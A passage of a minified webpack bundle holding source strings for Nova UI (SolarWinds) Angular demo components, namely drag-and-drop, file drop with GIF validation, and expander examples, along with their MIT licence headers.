LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-dragdrop-cdk-example",\n    templateUrl: "./dragdrop-cdk.example.component.html",\n    styleUrls: ["./dragdrop-cdk.example.component.less"],\n})\nexport class DragdropCdkExampleComponent {}\n'},98286:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='\x3c!--<nui-example-wrapper filenamePrefix="dragdrop-basic" exampleTitle="Drag and Drop">--\x3e\n\x3c!--<nui-dragdrop-validator-example></nui-dragdrop-validator-example>--\x3e\n\x3c!--</nui-example-wrapper>--\x3e\n\x3c!--<nui-example-wrapper filenamePrefix="dragdrop-cdk" exampleTitle="Drag and Drop CDK">--\x3e\n\x3c!--<nui-dragdrop-cdk-example></nui-dragdrop-cdk-example>--\x3e\n\x3c!--</nui-example-wrapper>--\x3e\n\n<h2>Basic Usage</h2>\n\n<p>\n    Usage is described in example below. FileDrop component is used internally\n    to handle dragLeave/dragEnter and encapsulate styling\n</p>\n<p>Example includes:</p>\n<ol>\n    <li>\n        Browse file using file system dialog with access to input properties\n        like "multiple" and "accept".\n    </li>\n    <li>\n        Effect while hovering file with wrong data type (for simplicity, example\n        code checks only first item in array) - this is implemented as an input\n        in FileDrop component.\n    </li>\n    <li>List of files with layout that is taken from UX specs</li>\n</ol>\n\n<nui-example-wrapper\n    filenamePrefix="dragdrop-files"\n    exampleTitle="Drag and Drop Files"\n>\n    <nui-dragdrop-files-example></nui-dragdrop-files-example>\n</nui-example-wrapper>\n\n<h2>File Drop Component</h2>\n<p>\n    Please see FileDrop component source code in this example (note that demo is\n    not interactive since this is purely presentational component)\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="file-drop"\n    exampleTitle="File Drop Component"\n>\n    <nui-file-drop-example><span>Any content</span></nui-file-drop-example>\n</nui-example-wrapper>\n'},66154:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-dragdrop-example",\n    templateUrl: "./dragdrop-docs.example.component.html",\n})\nexport class DragdropExampleComponent {}\n'},4162:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-file-drop-example\n    (drop)="dropHandler($event)"\n    (enter)="dragEnterHandler($event)"\n    (leave)="invalidateFiles()"\n    [state]="fileDropState"\n>\n    <ng-container *ngIf="gifError">\n        <nui-validation-message [show]="true">\n            Please upload GIF only!</nui-validation-message\n        >\n    </ng-container>\n    <ng-container *ngIf="!gifError">\n        <nui-icon icon="upload" class="pr-2" iconColor="gray"></nui-icon>\n        <span class="nui-text-small-secondary">\n            Drop only <b>GIF images</b> to upload, or\n            <label\n                for="uniqueOne"\n                class="nui-text-link-small nui-demo-drop-area__browse"\n                >browse</label\n            >\n        </span>\n    </ng-container>\n\n    \x3c!--this is hidden file input to handle browse button--\x3e\n    <input\n        type="file"\n        id="uniqueOne"\n        [accept]="imageType"\n        multiple\n        (change)="onFileRead($event)"\n        class="hidden"\n    />\n</nui-file-drop-example>\n\n<span class="nui-text-small-secondary">File types: GIF</span>\n\n<div class="nui-demo-file-area d-flex" *ngFor="let file of files">\n    <div class="py-2 px-3 flex-grow-1 flex-row">\n        <span class="nui-text-label">{{ file.name }}</span>\n        <nui-progress\n            [show]="true"\n            [stacked]="true"\n            [percent]="42"\n            [showNumber]="true"\n            (cancel)="onCancel()"\n        >\n        </nui-progress>\n    </div>\n    <div class="nui-demo-file-area__right flex-grow-0">\n        <button\n            nui-button\n            type="button"\n            displayStyle="action"\n            icon="close"\n            (click)="rmFile(file)"\n        ></button>\n    </div>\n</div>\n'},81018:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n.nui-demo {\n    &-drop-area {\n        &__browse {\n            cursor: pointer; // this would not be needed if nui-text-link had pointer - sadpanda\n            margin-bottom: 0; // this is needed sadpanda2\n        }\n    }\n\n    &-file-area {\n        width: 100%;\n        min-height: 30px; // icon size\n        .setCssVariable(border-color, nui-border-fade);\n        border-width: @nui-line-default;\n        border-bottom-width: 0;\n        border-style: solid;\n    }\n    &-file-area:last-child {\n        border-bottom-width: @nui-line-default; // this helps to merge borders of divs to look nice\n    }\n}\n'},83070:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { FileDropState } from "../file-drop/public-api";\n\n@Component({\n    selector: "nui-dragdrop-files-example",\n    templateUrl: "./dragdrop-files.example.component.html",\n    styleUrls: ["./dragdrop-files.example.component.less"],\n})\nexport class DragdropFilesExampleComponent {\n    public gifError = false;\n    public imageType = "image/gif";\n\n    public fileDropState = FileDropState.default;\n\n    public files: File[] = [];\n\n    dropHandler(ev: DragEvent): void {\n        if (!ev.dataTransfer) {\n            throw new Error("dataTransfer is not defined");\n        }\n        this.files.push(\n            ...this.extractFilesFromDropEventData(ev.dataTransfer).filter(\n                (file: File) => this.validateDataType(file.type)\n            )\n        );\n\n        this.invalidateFiles();\n    }\n\n    onFileRead(ev: Event): void {\n        const files: FileList | null = (ev.target as HTMLInputElement).files;\n        if (!files) {\n            throw new Error("fileList is not defined");\n        }\n        // no validation here since we have native one in browser input\n        this.files.push(...Array.from(files));\n    }\n\n    dragEnterHandler(ev: DragEvent): void {\n        // This naively checks only first file\n\n        if (ev.dataTransfer && ev.dataTransfer.items) {\n            this.gifError = !this.validateDataType(\n                ev.dataTransfer.items[0].type\n            );\n        }\n\n        this.fileDropState = this.gifError\n            ? FileDropState.error\n            : FileDropState.active;\n    }\n\n    invalidateFiles(): void {\n        // Change it if you want to have some error highlight even after dragLeave\n        this.fileDropState = FileDropState.default;\n        this.gifError = false;\n    }\n\n    rmFile(fileInput: File): void {\n        this.files = this.files.filter((file) => file !== fileInput);\n    }\n\n    private validateDataType(dataType: string) {\n        return dataType.includes(this.imageType);\n    }\n\n    // TODO: this can be extracted to a service\n    private extractFilesFromDropEventData(data: DataTransfer): File[] {\n        const files: File[] = [];\n        if (data.items) {\n            // Use DataTransferItemList interface to access the file(s)\n            for (let i = 0; i < data.items.length; i++) {\n                // If dropped items aren\'t files, reject them\n                if (data.items[i].kind === "file") {\n                    const file: File | null = data.items[i].getAsFile();\n                    if (file) {\n                        files.push(file);\n                    }\n                }\n            }\n        } else {\n            // Use DataTransfer interface to access the file(s) for Safari\n            for (let i = 0; i < data.files.length; i++) {\n                files.push(data.files[i]);\n            }\n        }\n        return files;\n    }\n}\n'},27535:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { DragDropModule } from "@angular/cdk/drag-drop";\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiCommonModule,\n    NuiDocsModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { NuiFileDropExampleModule } from "./file-drop/file-drop.module";\nimport {\n    DragdropBasicExampleComponent,\n    DragdropCdkExampleComponent,\n    DragdropExampleComponent,\n    DragdropFilesExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: DragdropExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.alpha,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        DragDropModule,\n        NuiButtonModule,\n        NuiDocsModule,\n        NuiCommonModule,\n        NuiFileDropExampleModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        DragdropExampleComponent,\n        DragdropBasicExampleComponent,\n        DragdropCdkExampleComponent,\n        DragdropFilesExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("dragdrop"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class DragDropDemoModule {}\n'},77218:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="<ng-content></ng-content>\n"},23450:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n@drop-zone-min-height: 50px;\n\n:host {\n    display: flex;\n    padding: @nui-space-sm;\n    width: 100%;\n    min-height: @drop-zone-min-height;\n    border-style: dashed; // TODO: no border-style-dashed in NUI\n    border-width: @nui-line-default;\n    .setCssVariable(border-color, nui-color-line-default);\n    &.nui-file-drop {\n        &--active,\n        &--error {\n            border-width: @nui-line-fat;\n            border-style: solid;\n        }\n        &--active {\n            .setCssVariable(border-color, nui-color-selected-contrast);\n            .setCssVariable(background-color, nui-color-busy-default);\n        }\n        &--error {\n            .setCssVariable(border-color, nui-color-line-critical);\n            .setCssVariable(background-color, nui-color-busy-destructive);\n        }\n    }\n}\n'},93310:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    Component,\n    EventEmitter,\n    HostBinding,\n    HostListener,\n    Input,\n    Output,\n} from "@angular/core";\n\nimport { FileDropState } from "./public-api";\n\n/**\n * <example-url>./../examples/index.html#/file-upload</example-url>\n */\n\n/** @ignore */\n@Component({\n    selector: "nui-file-drop-example",\n    templateUrl: "./file-drop.component.html",\n    styleUrls: ["./file-drop.component.less"],\n    host: {\n        class: "d-inline-flex align-items-center justify-content-center",\n    },\n})\nexport class FileDropExampleComponent {\n    // TODO: consider renaming this class to DropAreaComponent since it is not file-specific at all\n\n    private counterToHackDragLeave = 0;\n\n    @Input() public state: FileDropState = FileDropState.default;\n\n    @Output() public enter = new EventEmitter<DragEvent>();\n    @Output() public leave = new EventEmitter<DragEvent>();\n    // Drop is handled as regular JS event in parent component.\n    // enter and leave can\'t be since dragenter and dragleave for parent component are different\n\n    @HostBinding("class.nui-file-drop--active")\n    get hasActiveClass(): boolean {\n        return this.state === FileDropState.active;\n    }\n\n    @HostBinding("class.nui-file-drop--error")\n    get hasErrorClass(): boolean {\n        return this.state === FileDropState.error;\n    }\n\n    // this solves problem with opening the file since browser fires dragover by default\n    @HostListener("window:dragover", ["$event"])\n    dragOverHandler(ev: DragEvent): void {\n        // Prevent default behavior (Prevent file from being opened)\n        ev.preventDefault();\n    }\n\n    @HostListener("drop", ["$event"])\n    dropHandler(ev: DragEvent): void {\n        // Prevent default behavior (Prevent file from being opened)\n        ev.preventDefault();\n        this.counterToHackDragLeave = 0; // important not to break mouseleave hack\n    }\n\n    @HostListener("dragenter", ["$event"])\n    dragEnterHandler(ev: DragEvent): void {\n        // Prevent default behavior (Prevent file from being opened)\n        ev.preventDefault();\n        this.counterToHackDragLeave++;\n        if ((ev.currentTarget as Node).contains(ev.currentTarget as Node)) {\n            this.enter.emit(ev);\n        }\n    }\n\n    @HostListener("dragleave", ["$event"])\n    dragLeaveHandler(ev: DragEvent): void {\n        // Prevent default behavior (Prevent file from being opened)\n        ev.preventDefault();\n\n        this.counterToHackDragLeave--;\n        if (this.counterToHackDragLeave === 0) {\n            this.leave.emit(ev);\n        }\n    }\n}\n'},27185:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\n\nimport { NuiCommonModule } from "@nova-ui/bits";\n\nimport { FileDropExampleComponent } from "./file-drop.component";\n\n/**\n * @ignore\n */\n@NgModule({\n    imports: [NuiCommonModule],\n    declarations: [FileDropExampleComponent],\n    exports: [FileDropExampleComponent],\n    providers: [],\n})\nexport class NuiFileDropExampleModule {}\n'},94163:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport enum FileDropState {\n    active = "active",\n    error = "error",\n    default = "default",\n}\n'},29384:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./dragdrop-docs/dragdrop-docs.example.component";\nexport * from "./dragdrop-basic/dragdrop-basic.example.component";\nexport * from "./dragdrop-cdk/dragdrop-cdk.example.component";\nexport * from "./dragdrop-files/dragdrop-files.example.component";\n'},35088:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-expander id="nui-demo-expander-basic">\n    <p i18n>Content is here</p>\n</nui-expander>\n'},98736:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-expander-basic-example",\n    templateUrl: "expander-basic.example.component.html",\n})\nexport class ExpanderBasicExampleComponent {}\n'},96578:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-inline-block col-lg-2 col-md-4 col-sm-8 px-0">\n    <nui-expander id="nui-demo-expander-custom-header">\n        <div\n            nuiExpanderHeader\n            class="d-flex align-items-center justify-content-between"\n        >\n            <span i18n class="nui-text-label">Advanced options</span>\n            <nui-menu\n                class="ml-3"\n                id="nui-demo-expander-header-menu"\n                icon="menu"\n                displayStyle="action"\n                [itemsSource]="itemsSource"\n                nuiClickInterceptor\n            ></nui-menu>\n        </div>\n        <p i18n>Content is here</p>\n    </nui-expander>\n</div>\n'},66961:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IMenuGroup } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-expander-custom-header-example",\n    templateUrl: "expander-custom-header.example.component.html",\n})\nexport class ExpanderCustomHeaderExampleComponent {\n    public itemsSource: IMenuGroup[] = [\n        {\n            header: "Group 1",\n            itemsSource: [\n                {\n                    title: $localize`Item 1`,\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: $localize`Item 2`,\n                    itemType: "action",\n                    action: (): void => alert($localize`hello`),\n                },\n            ],\n        },\n        {\n            itemsSource: [\n                {\n                    title: $localize`Item 3`,\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n            ],\n        },\n    ];\n\n    constructor() {}\n\n    public actionDone(): void {\n        console.log("Action Done");\n    }\n}\n'},2334:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiExpanderModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To implement basic <code>&lt;nui-expander&gt;</code> wrap content with\n    <code>&lt;nui-expander&gt;</code> element.\n</p>\n<nui-example-wrapper filenamePrefix="expander-basic" exampleTitle="Basic usage">\n    <nui-expander-basic-example></nui-expander-basic-example>\n</nui-example-wrapper>\n\n<h2>Header Text</h2>\n<p>\n    To add heading to <code>&lt;nui-expander&gt;</code> header you need to pass\n    <code>header</code> property with text, that you want to be added as a\n    expander heading.\n</p>\n<nui-example-wrapper\n    filenamePrefix="expander-header-text"\n    exampleTitle="Header text"\n>\n    <nui-expander-header-text-example></nui-expander-header-text-example>\n</nui-example-wrapper>\n\n<h2>Header Text and Icon</h2>\n<p>\n    To add icon to <code>&lt;nui-expander&gt;</code> header you need to pass\n    <code>icon</code> property with the name of the icon.\n</p>\n<nui-example-wrapper\n    filenamePrefix="expander-text-and-icon"\n    exampleTitle="Header text and icon"\n>\n    <nui-expander-text-and-icon-example></nui-expander-text-and-icon-example>\n</nui-example-wrapper>\n\n<h2>Custom Header</h2>\n\n<p>\n    Instead of using <code>header</code> and <code>icon</code> properties to set\n    expander\'s header you can create custom expander header. To create custom\n    header you need to pass custom content inside\n    <code>&lt;nui-expander&gt;</code> and to add\n    <code>nuiExpanderHeader</code> attribute to the element, which contains this\n    custom content.\n</p>\n<p>\n    Components with independent actions may be embedded into custom expander\n    header. The following example demonstrates how to create custom expander\n    header with embedded menu.\n</p>\n\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> The following example makes use of the\n    <code>nuiClickInterceptor</code> directive. To use this directive, be sure\n    to import <code>NuiCommonModule</code> in your component\'s parent module.\n</nui-message>\n\n<nui-example-wrapper\n    filenamePrefix="expander-custom-header"\n    exampleTitle="Custom header"\n>\n    <nui-expander-custom-header-example></nui-expander-custom-header-example>\n</nui-example-wrapper>\n\n<h2>Initially Expanded</h2>\n<p>\n    If you want to have <code>&lt;nui-expander&gt;</code> opened by default you\n    need to pass <code>[open]="true"</code> property into the\n    <code>&lt;nui-expander&gt;</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="expander-initially-expanded"\n    exampleTitle="Initially expanded"\n>\n    <nui-expander-initially-expanded-example></nui-expander-initially-expanded-example>\n</nui-example-wrapper>\n\n<h2>Subscribing to Open Change</h2>\n<p>\n    If you want to subscribe to <code>&lt;nui-expander&gt;</code> opening and\n    closing event you need to use <code>(openChange)</code> output.\n</p>\n<nui-example-wrapper\n    filenamePrefix="expander-open-change"\n    exampleTitle="Subscribing to open change"\n>\n    <nui-expander-open-change-example></nui-expander-open-change-example>\n</nui-example-wrapper>\n\n<h2>Without Expand Line</h2>\n<p>\n    If you want to remove left dotted line from\n    <code>&lt;nui-expander&gt;</code> you need to pass\n    <code>[hideLeftBorder]="true"</code> to <code>&lt;nui-expander&gt;</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="expander-without-border"\n    exampleTitle="Without expand line"\n>\n    <nui-expander-without-border-example></nui-expander-without-border-example>\n</nui-example-wrapper>\n'},16954:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-expander-docs-example",\n    templateUrl: "expander-docs.example.component.html",\n})\nexport class ExpanderDocsExampleComponent {}\n'},17370:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-expander\n    id="nui-demo-expander-header-text"\n    i18n-header\n    header="Advanced Layout Settings"\n>\n    <p i18n>Content goes here</p>\n</nui-expander>\n'},55078:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS 